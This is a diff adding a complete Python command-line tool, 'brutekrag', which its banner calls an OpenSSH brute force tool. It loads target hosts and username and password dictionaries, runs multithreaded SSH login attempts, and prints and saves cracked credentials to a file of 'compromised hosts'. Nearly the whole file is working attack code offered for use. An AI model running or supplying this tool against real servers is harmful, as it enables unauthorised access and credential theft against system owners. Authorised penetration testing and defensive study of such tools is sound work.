@@ -1,0 +1,274 @@
+#!/usr/bin/env python
+"""
+MIT License
+
+Copyright (c) 2014-2017 Jorge Matricali
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+"""
+
+from __future__ import print_function
+import sys
+import brutekrag
+import argparse
+from argparse import RawTextHelpFormatter
+import threading
+import signal
+import time
+from tqdm import tqdm
+
+exit_flag = False
+threads = []
+matrix = []
+processed = 0
+total = 0
+compromisedHostsBuffer = None
+
+
+def teardown(signal=0):
+    print('Stopping threads...')
+    exit_flag = True
+    try:
+        for t in threads:
+            try:
+                t.stop()
+            except Exception as e:
+                print(e)
+    except Exception as e:
+        print(e)
+    sys.exit(signal)
+
+
+def signal_handler(signal, frame):
+    teardown(0)
+
+
+def print_error(message, *arguments):
+    if args.progress:
+        return
+    print('\033[91m%s\033[0m' % message, *arguments, file=(sys.stderr, None)[args.progress])
+
+
+def print_debug(message, *arguments):
+    if args.progress or not args.verbose:
+        return
+    print('\033[37m%s\033[0m' % message, *arguments, file=(sys.stderr, None)[args.progress])
+
+
+def update_progress(count, total, suffix=''):
+    bar_len = 60
+    filled_len = int(round(bar_len * count / float(total)))
+
+    percents = round(100.0 * count / float(total), 1)
+    bar = '=' * filled_len + '-' * (bar_len - filled_len)
+
+    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', suffix + ' '*10))
+    sys.stdout.flush()
+
+
+class brutekragThread(threading.Thread):
+    def __init__(self, threadID, name, **kwargs):
+        super(brutekragThread, self).__init__()
+        self._threadID = threadID
+        self._name = name
+        self._running = True
+        self._verbose = False
+        if 'verbose' in kwargs:
+            self._verbose = bool(kwargs.get('verbose'))
+
+    def run(self):
+        global processed
+        self.log('Starting thread...')
+        while(matrix and self._running):
+            try:
+                loginAttempt = matrix.pop()
+                btkg = brutekrag.brutekrag(loginAttempt[0], args.port, timeout=args.timeout)
+                if btkg.connect(loginAttempt[1], loginAttempt[2]) is True:
+                    print('\033[37m[%s:%d]\033[0m The password for user \033[1m%s\033[0m is \033[92m\033[1m%s\033[0m' % (loginAttempt[0], args.port, loginAttempt[1], loginAttempt[2]))
+                    if args.output is not None:
+                        print('%s:%d %s:%s' % (loginAttempt[0], args.port, loginAttempt[1], loginAttempt[2]), file=compromisedHostsBuffer)
+                        compromisedHostsBuffer.flush()
+                    if args.user is not None:
+                        # This execution aims to a single user, so all the job is done. :D
+                        teardown(0)
+                        break
+                else:
+                    if args.progress:
+                        last = '[%d/%d] %s:%d %s:%s' % (processed+1, total, loginAttempt[0], args.port, loginAttempt[1], loginAttempt[2])
+                        update_progress(processed+1, total, last)
+                    else:
+                        print_debug('[%s:%d] password %s for user %s is not valid.' % (loginAttempt[0], args.port, loginAttempt[2], loginAttempt[1]))
+            except Exception as ex:
+                print_error(str(ex))
+            processed += 1
+        self.stop()
+
+    def stop(self):
+        self.log('Stopping...')
+        self._running = False
+
+    def log(self, *args):
+        if self._verbose:
+            print(time.ctime(time.time()), self._name, *args)
+
+
+banner = ('''\033[92m      _                _       _
+     | |              | |     | |
+     | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _
+     | '_ \| '__| | | | __/ _ \ |/ / '__/ _` |/ _` |
+     | |_) | |  | |_| | ||  __/   <| | | (_| | (_| |
+     |_.__/|_|   \__,_|\__\___|_|\_\_|  \__,_|\__, |
+            \033[0m\033[1mOpenSSH Brute force tool 0.3.1\033[92m     __/ |
+          \033[0m(c) Copyright 2014 Jorge Matricali\033[92m  |___/\033[0m
+          \n''')
+
+signal.signal(signal.SIGINT, signal_handler)
+parser = argparse.ArgumentParser(description=banner,
+                                 formatter_class=RawTextHelpFormatter)
+
+parser.add_argument('-t', '--target', type=str, help='Target hostname or IPv4.')
+parser.add_argument('-T', '--targets', type=str, help='Targets file that containas one hostname or IPv4 per line.')
+parser.add_argument('-pF', '--passwords', type=str, help='Path to password dictionary file. One password per line.')
+parser.add_argument('-uF', '--users', type=str, help='Path to users list file. One user per line.')
+parser.add_argument('-sF', '--single', type=str, help='Path to a file that contains a combination of both username and password. One combination per line, separated by space character by default.')
+parser.add_argument('--separator', type=str, help='Custom username/password separator. It\'s should be used in conjunction with -sF.', default=' ')
+parser.add_argument('-p', '--port', type=int, help='Target port (default 22).', default=22)
+parser.add_argument('-u', '--user', type=str, help='Single user bruteforce.')
+parser.add_argument('-P', '--password', type=str, help='Single password bruteforce.')
+parser.add_argument('--timeout', type=int, help='Connection timeout (in seconds, 1 default).', default=1)
+parser.add_argument('--threads', type=int, default=1, help='Total number of threads to use (default 1).')
+parser.add_argument('-o', '--output', type=str, default=None, help='Output file for compromised hosts.')
+parser.add_argument('--progress', action='store_true', help='Progress bar.')
+parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output.')
+parser.add_argument('--version', action='store_true', help='Prints version and banner.')
+
+try:
+    args = parser.parse_args()
+except TypeError:
+    parser.print_help()
+    parser.exit()
+
+print(banner)
+
+if args.version:
+    sys.exit(0)
+
+'''
+PARSE TARGETS
+'''
+if args.target is not None:
+    targets = [args.target]
+elif args.targets is not None:
+    targets = []
+    with open(args.targets, 'r') as targetsFile:
+        for target in targetsFile:
+            targets.append(target)
+        targetsFile.close()
+    print('Loaded %d targets from %s' % (len(targets), args.targets))
+else:
+    print_error('You must specify al most one target.')
+    sys.exit(255)
+
+'''
+PARSE USERS
+'''
+if args.user is not None:
+    users = [args.user]
+elif args.users is not None:
+    users = []
+    with open(args.users, 'r') as usersFile:
+        for user in usersFile:
+            users.append(user)
+        usersFile.close()
+    print('Loaded %d users from %s' % (len(users), args.users))
+elif args.single is None:
+    print_error('You must specify al most one username.')
+    sys.exit(255)
+
+'''
+PARSE PASSWORDS
+'''
+if args.password is not None:
+    passwords = [args.password]
+elif args.passwords is not None:
+    passwords = []
+    with open(args.passwords, 'r') as passwordsFile:
+        for password in passwordsFile:
+            passwords.append(password)
+        passwordsFile.close()
+    print('Loaded %d passwords from %s\n' % (len(passwords), args.passwords))
+elif args.single is None:
+    print_error('You must specify a password dictionary.')
+    sys.exit(255)
+
+'''
+OUTPUT BUFFER
+'''
+if args.output is not None:
+    try:
+        compromisedHostsBuffer = open(args.output, 'a')
+    except Exception as error:
+        print_error('Can\'t output to %s: %s' % (args.output, str(error)))
+
+
+'''
+BUILD MATRIX
+'''
+if args.single is not None:
+    # Single file
+    dictionary = []
+    with open(args.single, 'r') as dictionaryFile:
+        for line in dictionaryFile:
+            dictionary.append(line)
+        dictionaryFile.close()
+    print('Loaded %d combinations of username and password from %s\n' % (len(dictionary), args.single))
+
+    for line in dictionary:
+        username, password = line.split(args.separator)
+        password = password.strip('$BLANKPASS')
+        for target in targets:
+            matrix.append([target.strip(), username.strip(), password.strip('\n')])
+
+else:
+    # Separated  1n1 username passwords
+    print('')
+    for username in users:
+        for password in passwords:
+            password = password.strip('$BLANKPASS')
+            for target in targets:
+                matrix.append([target.strip(), username.strip(), password.strip('\n')])
+
+total = len(matrix)
+matrix.reverse()
+print('%d total loggin attemps.' % len(matrix))
+print('Starting %d threads...\n' % args.threads)
+
+threads = [None]*args.threads
+for nt in range(args.threads):
+    threads[nt] = brutekragThread(nt+1, 'Thread-%d' % (nt+1), verbose=args.verbose)
+    threads[nt].daemon = True
+    threads[nt].start()
+
+while(threads):
+    for t in threads:
+        if not t._running:
+            threads.remove(t)
+
+
+print('Bye...')
